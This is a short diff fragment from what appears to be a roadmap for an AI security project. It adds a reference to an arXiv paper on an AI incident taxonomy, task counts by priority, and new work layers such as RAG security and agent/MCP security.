+30. arXiv 2511.21901 — Unified AI taxonomy, 133 incidents validated
+
+---
+
+**Totals**: P0: 30 | P1: 75 | P2: 82 tasks across 20 layers + Vision
+**New Layers**: L17 Doc Scanning, L18 RAG Security, L19 Agent/MCP, L20 Taxonomy Automation
+**Last Updated**: 2026-02-14
